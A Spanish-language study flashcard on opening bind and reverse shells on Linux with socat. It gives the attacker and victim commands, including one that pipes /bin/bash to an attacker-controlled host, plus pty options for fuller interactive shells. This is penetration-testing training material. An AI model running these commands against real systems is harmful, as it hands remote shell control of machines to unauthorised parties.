**Flashcard: Reverse and Bind Shells con Socat en Linux**

---

**Requisitos previos:**

* Instalar `socat` en ambas máquinas (atacante y víctima).
* Permisos adecuados para abrir puertos y ejecutar comandos.

---

### 1. Bind Shell con Socat (Victim escucha, Attacker se conecta)

**Victim (Linux objetivo) escucha en puerto 4444:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

* `TCP-LISTEN:4444`: abre puerto 4444 escuchando.
* `reuseaddr`: permite reusar dirección.
* `fork`: crea nuevo proceso para cada conexión.
* `EXEC:/bin/bash`: ejecuta shell al conectar.

**Attacker se conecta con:**

```bash
socat -,raw,echo=0 TCP:<Victim-IP>:4444
```

* Accede al shell remoto.

---

### 2. Reverse Shell con Socat (Victim conecta al Attacker)

**Attacker escucha en puerto 4444:**

```bash
socat TCP-LISTEN:4444,reuseaddr -
```

**Victim ejecuta:**

```bash
socat EXEC:/bin/bash TCP:<Attacker-IP>:4444
```

* Victim conecta al atacante y redirige shell a la conexión.

---

### 3. Técnica Especial (Túnel entre tty y socat para shell interactivo mejorado)

**Victim:**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

* `pty`: pseudo-terminal asignado para shell interactivo.
* `bash -li`: shell interactiva login para mejor comportamiento.

**Attacker:**

```bash
socat -,raw,echo=0 TCP:<Victim-IP>:4444
```

---

### Notas:

* Socat mejora estabilidad y control del shell respecto a netcat.
* Usar `-raw,echo=0` para evitar eco local en conexión attacker.
* `pty` y opciones avanzadas permiten shells más completas.
* Siempre limpiar procesos y cerrar conexiones tras uso.

---